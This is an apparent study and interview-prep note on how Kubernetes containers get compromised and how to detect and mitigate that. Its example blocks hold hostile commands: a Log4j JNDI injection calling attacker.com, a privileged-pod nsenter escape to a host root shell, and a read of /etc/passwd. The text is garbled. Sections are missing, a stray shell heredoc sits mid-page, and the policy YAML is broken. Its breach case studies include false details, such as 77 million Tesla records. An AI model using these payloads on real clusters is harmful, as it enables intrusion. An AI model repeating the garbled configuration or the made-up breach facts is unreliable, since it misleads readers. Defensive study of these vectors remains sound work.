# 01.08 - Compromised Containers

## 1️⃣ What This Topic Is

Compromised Containers examines how attackers compromise containerized applications and how to detect and respond to container breaches in Kubernetes environments.

**What this means:**
- Compromised container = attacker has access inside container
- Attacker can execute code, steal data, or escape to host
- Multiple compromise vectors exist (images, applications, credentials)
- Understanding compromise helps contain breaches

**The Key Concepts:**

1. **Compromise Types**
   - Container image compromise (malicious images)
   - Application compromise (RCE, XSS, SQLi)
   - Supply chain compromise (malicious dependencies)
   - Credential compromise (secrets, service accounts)

2. **Compromise Indicators**
   - Suspicious processes running
   - Unusual network connections
   - Unexpected file modifications
   - Abnormal resource usage
   - Unexpected API calls

**Why this matters:**
- Container compromise is common attack vector
- Can lead to cluster compromise
- Enables data theft and persistence
- Understanding compromise helps contain breaches

### Problem 1: Invisible Container Compromise

**Without understanding compromised containers:**
- Can't detect when container is compromised
- Attacker operates undetected

**With understanding compromised containers:**

- Can remediate before cluster compromise

### Problem 2: Container Escape to Host

**Without understanding compromised containers:**
- Can't detect when container escapes to host
- Attacker compromises worker node
- Lateral movement to other nodes
- Cluster-wide compromise

**With understanding compromised containers:**
- Know container escape vectors
- Can detect escape attempts
- Can prevent host compromise
- Can contain breach to single container

### Problem 3: Data Exfiltration

**Without understanding compromised containers:**
- Can't detect data exfiltration
- Attacker steals data undetected
- Compliance violations (GDPR, HIPAA)
- Reputation damage

**With understanding compromised containers:**
- Know data exfiltration vectors
- Can detect unusual data access
- Can detect unusual network activity
- Can prevent data theft

### Real-World Impact

**Example: Tesla Kubernetes Breach (2018)**
- **Vulnerability**: Compromised kubeconfig credentials
- **Root cause**: No detection of container compromise
- **Compromise issue**: Attacker accessed cluster via compromised container
- **Impact**: Attacker accessed 77 million customer records
- **Lesson**: Monitor for compromised containers, detect data exfiltration

**Example: Equifax Breach (2017)**
- **Vulnerability**: Apache Struts RCE (container compromise)
- **Root cause**: No vulnerability scanning, no monitoring
- **Compromise issue**: Attacker executed code via Struts
- **Impact**: 147 million records exposed
- **Lesson**: Scan images, monitor for compromise, patch dependencies

**Example: Capital One Breach (2019)**
- **Vulnerability**: Compromised container credentials
- **Root cause**: No credential rotation, no monitoring
- **Compromise issue**: Attacker accessed containers via stolen credentials
- **Impact**: 106 million customer records accessed
- **Lesson**: Rotate credentials, monitor for compromise

## 4️⃣ How It Works (Conceptual)

### Container Compromise Vectors

**1. Container Image Compromise**
- **Purpose**: Exploit vulnerabilities in container images
- **Attacker Use**: Scan for CVEs, exploit to gain access
- **Detection Challenge**: Images appear legitimate
- **Example**: Exploit CVE in base image to gain shell

**Attack Flow:**
```
Attacker scans for CVEs → Exploits vulnerable base image → Gains shell access in container → Attacker has access → Data theft, persistence, escape
```

**Detection:**
- Scan images for vulnerabilities
- Check image hashes
- Use image signing and verification

**Mitigation:**
- Use minimal, updated base images
- Scan images before deployment
- Use image signing and verification
- Use private image registry

**Example**:
```bash
# Attacker exploits vulnerable image
kubectl run vulnerable-pod --image=vulnerable:latest -- sh -c "whoami && cat /etc/passwd"
```

**2. Application Compromise**
- **Purpose**: Exploit application vulnerabilities (RCE, XSS, SQLi)
- **Attacker Use**: Exploit CVEs in application code
- **Detection Challenge**: Application appears legitimate
- **Example**: Exploit Log4j RCE to execute code

**Attack Flow:**
```
Attacker exploits application CVE → Remote code execution in application → Attacker gains application access → Data theft, persistence
```

**Detection:**
- Scan applications for vulnerabilities
- Monitor for unusual application behavior
- Use WAF (Web Application Firewall)

**Mitigation:**
- Scan applications for vulnerabilities
- Patch dependencies regularly
- Use security libraries
- Implement input validation

**Example**:
```bash
# Attacker exploits Log4j RCE
curl -X POST -H "X-Api-Version: 1.0" -H "Content-Type: application/json" \
  -d '{"name":"${jndi:ldap://attacker.com/a}"}' \
  http://webserver.cluster.com/api/v1/users
```

**3. Supply Chain Compromise**
- **Purpose**: Plant malicious code in build process
- **Attacker Use**: Compromise CI/CD pipeline, inject malicious code
- **Detection Challenge**: Malicious code is built legitimately
- **Example**: Typosquatting (malicious package with legitimate name)

**Attack Flow:**
```
Attacker compromises CI/CD → Attacker injects malicious code → Malicious code built into image → Image deployed to production → Malicious code executes → Container compromised
```

**Detection:**
- Use SBOM (Software Bill of Materials)
- Verify package hashes
- Scan images for malicious code
- Use private image registry

**Mitigation:**
- Scan images for vulnerabilities
- Use image signing and verification
- Use private package registries
- Secure build pipeline

**Example**:
```json
// package.json with malicious dependency
{
  "name": "myapp",
  "dependencies": {
    "express": "^4.18.0",
    "malicious-package": "1.0.0"  // Typosquatting attack
  }
}
```

**4. Credential Compromise**
- **Purpose**: Exploit stolen credentials to access containers
- **Attacker Use**: Use stolen kubeconfig, secrets, service accounts
- **Detection Challenge**: Attacker uses legitimate credentials
- **Example**: Use compromised kubeconfig to create malicious pods

**Attack Flow:**
```
Attacker obtains kubeconfig → Attacker authenticates to API server → Attacker creates malicious pods → Container compromised → Data theft, persistence, escape
```

**Detection:**
- Monitor for unusual API calls
- Monitor for unusual object creation
- Monitor for unusual resource access
- Implement credential rotation policies

**Mitigation:**
- Rotate credentials regularly
- Use MFA for authentication
- Use short-lived credentials
- Implement audit logging

**Example**:
```bash
# Attacker uses compromised kubeconfig
kubectl run malicious-pod --image=attacker:latest -- sh -c "whoami && ps aux"
```

**5. Runtime Compromise**
- **Purpose**: Exploit container runtime vulnerabilities
- **Attacker Use**: Exploit CVEs in containerd, Docker, etc.
- **Detection Challenge**: Runtime appears legitimate
- **Example**: Container escape via vulnerable runtime

**Attack Flow:**
```
Attacker exploits runtime CVE → Container escape to host → Attacker executes code on host → Container compromised → Cluster compromise
```

**Detection:**
- Monitor for container escape attempts
- Monitor for host process execution
- Use Falco for runtime security

**Mitigation:**
- Update container runtime regularly
- Use secure runtime configurations
- Use security contexts (non-root, read-only)
- Implement seccomp/AppArmor profiles

**Example**:
```bash
# Container escape via privileged container
kubectl run privileged-pod --image=alpine --privileged -- sh -c "nsenter -t 1 -m -u root bash"
```

### Compromise Detection Techniques

**1. Process Monitoring**
- Monitor for suspicious processes
- Detect unusual process execution
- Detect crypto mining processes
- Detect backdoor processes

**2. Network Monitoring**
- Monitor for unusual network connections
- Detect data exfiltration (large outbound transfers)
- Detect connections to known C2 servers
- Detect unusual network patterns

**3. File System Monitoring**
- Monitor for unexpected file modifications
- Detect file deletions or modifications
- Detect suspicious file access

**4. Resource Monitoring**
- Monitor for abnormal resource usage
- Detect unusual CPU/memory usage
- Detect crypto mining
- Detect resource exhaustion attacks

**5. Audit Log Analysis**
- Monitor audit logs for suspicious activities
- Detect unusual API calls
- Detect unusual object creation
- Detect unusual resource access

echo ""
echo "3. Implementing Security Contexts..."
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Namespace
metadata:
  name: secure
---
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  namespace: secure
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: nginx:1.25-alpine
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: [ALL]
      readOnlyRootFilesystem: true
EOF

echo ""
echo "4. Implementing Pod Security Policies..."

apiVersion: policy/v1beta1

  name: restricted

  allowPrivilegeEscalation: false
  requiredDropCapabilities:
  - ALL
  volumes:
  - configMap
  - downwardAPI
  - emptyDir
  - persistentVolumeClaim
  - secret
  hostNetwork: false
  hostIPC: false
  hostPID: false

    rule: MustRunAsNonRoot

## 8️⃣ Security Best Practices

### **Do's ✅**

**1. Implement Runtime Monitoring**
- Use Falco for runtime security
- Monitor for suspicious processes
- Monitor for container escape attempts
- Monitor for unusual system calls

**2. Use Security Contexts**
- Run as non-root user
- Drop all capabilities
- Use read-only filesystem
- Implement seccomp/AppArmor profiles

**3. Use Pod Security Policies**
- Enforce security configurations
- Require non-root users
- Drop capabilities
- Restrict volume types

**4. Monitor for Compromise Indicators**
- Monitor for suspicious processes
- Monitor for unusual network connections
- Monitor for unexpected file modifications
- Monitor for abnormal resource usage

**5. Implement Image Scanning**
- Scan images for vulnerabilities
- Scan for malicious code
- Use image signing and verification
- Use private image registry

**6. Rotate Credentials Regularly**
- Rotate kubeconfig regularly
- Rotate secrets regularly
- Use short-lived service account tokens
- Implement MFA

**7. Conduct Regular Security Reviews**
- Review security contexts regularly
- Review PSPs regularly
- Review images and dependencies regularly
- Conduct penetration testing

### **Don'ts ❌**

**1. Don't Run as Root**
- Root access in containers is dangerous
- Always use runAsNonRoot: true

**2. Don't Skip Image Scanning**
- Images may have vulnerabilities or malicious code
- Always scan images before deployment

**3. Don't Skip Runtime Monitoring**
- Compromise is invisible without monitoring
- Always implement runtime monitoring

**4. Don't Ignore Credential Rotation**
- Stolen credentials enable re-compromise
- Always rotate credentials regularly

### **Common Interview Questions**

**Q1: What are common compromise vectors in Kubernetes?**
**Good Answer**: Common compromise vectors in Kubernetes include:

1. **Container Image Compromise**: 
   - Exploit CVEs in base images
   - Use malicious images
   - Attacker gains shell access in container

2. **Application Compromise**: 
   - Exploit RCE vulnerabilities in applications
   - Exploit XSS, SQLi
   - Install backdoors in applications
   - Attacker gains application access

3. **Supply Chain Compromise**: 
   - Typosquatting (malicious packages)
   - Compromised CI/CD pipeline
   - Malicious code built into images
   - Attacker gains code execution when image runs

4. **Credential Compromise**: 
   - Stolen kubeconfig
   - Stolen secrets
   - Stolen service account tokens
   - Attacker accesses cluster

5. **Runtime Compromise**: 
   - Exploit CVEs in containerd, Docker, etc.
   - Container escape to host
   - Attacker executes code on host
   - Cluster compromised

Each vector allows attacker to compromise containers.

**Q2: How do you detect compromised containers in Kubernetes?**
**Good Answer**: Container compromise detection in Kubernetes includes:

1. **Process Monitoring**: 
   - Monitor for suspicious processes (Falco)
   - Detect crypto mining processes
   - Detect backdoor processes
   - Detect unusual process execution

2. **Network Monitoring**: 
   - Monitor for unusual network connections
   - Detect data exfiltration
   - Detect connections to known C2 servers
   - Detect unusual network patterns

3. **File System Monitoring**: 
   - Monitor for unexpected file modifications
   - Detect file deletions or modifications
   - Detect suspicious file access

4. **Resource Monitoring**: 
   - Monitor for abnormal resource usage
   - Detect unusual CPU/memory usage
   - Detect crypto mining
   - Detect resource exhaustion

5. **Audit Log Analysis**: 
   - Monitor audit logs for suspicious activities
   - Detect unusual API calls
   - Detect unusual object creation
   - Detect unusual resource access

Detection tools: Falco, Prometheus, etc.

**Q3: How do you mitigate compromised containers in Kubernetes?**
**Good Answer**: Container compromise mitigation in Kubernetes includes:

1. **Security Contexts**: 
   - Run as non-root user
   - Drop all capabilities
   - Use read-only filesystem
   - Implement seccomp/AppArmor profiles
   - Prevent privilege escalation

2. **Pod Security Policies**: 
   - Enforce security configurations
   - Require non-root users
   - Drop capabilities
   - Restrict volume types
   - Enforce least privilege

3. **Image Security**: 
   - Scan images for vulnerabilities
   - Use image signing and verification
   - Use minimal, updated base images
   - Use private image registry

4. **Application Security**: 
   - Scan applications for vulnerabilities
   - Patch dependencies regularly
   - Use security libraries
   - Implement input validation

5. **Runtime Monitoring**: 
   - Monitor for suspicious processes (Falco)
   - Monitor for container escape attempts
   - Set up alerts for suspicious activity
   - Enable automated response

6. **Incident Response**: 
   - Document compromise detection procedures
   - Document remediation procedures
   - Implement automated response
   - Conduct regular drills

Combined approach provides defense in depth against compromise.

**Q4: What's the most dangerous compromise vector in Kubernetes?**
**Good Answer**: The most dangerous compromise vectors are:

1. **Runtime Compromise (Container Escape)**: Because it's most dangerous
   - Attacker can execute code on host
   - Cluster compromised if host is control plane
   - Enables lateral movement and persistence

2. **Supply Chain Compromise**: Because it's hardest to detect
   - Malicious code built legitimately
   - Backdoors are built into images
   - Hard to scan for malicious code

3. **Credential Compromise**: Because it's common
   - Stolen kubeconfig gives cluster access
   - Service account tokens give access
   - Can lead to cluster-wide compromise

Container escape (runtime) is most dangerous because it compromises host. Supply chain is most dangerous because it's hardest to detect. Credential compromise is most dangerous because it's common.

**Q5: How do Pod Security Policies help prevent compromise?**
**Good Answer**: PSPs help prevent compromise by:

1. **Enforcing Security Configurations**: 
   - Require non-root users
   - Prevent privileged containers
   - Require dropping capabilities
   - Restrict volume types

2. **Preventing Privilege Escalation**: 
   - Set allowPrivilegeEscalation to false
   - Prevent privilege escalation within container
   - Prevent container escape attempts

3. **Restricting Access**: 
   - Restrict host access
   - Restrict network access
   - Restrict file system access
   - Prevent lateral movement

4. **Validating Images**: 
   - Validate images before deployment
   - Implement image scanning policies
   - Reject vulnerable images
   - Prevent malicious code execution

5. **Monitoring and Alerting**: 
   - Alert on PSP violations
   - Detect insecure configurations
   - Enable automated response
   - Prevent deployment of insecure pods

PSPs enforce security standards and prevent insecure configurations that enable compromise.

Compromised Containers examines how attackers compromise containerized applications and how to detect and respond to container breaches.
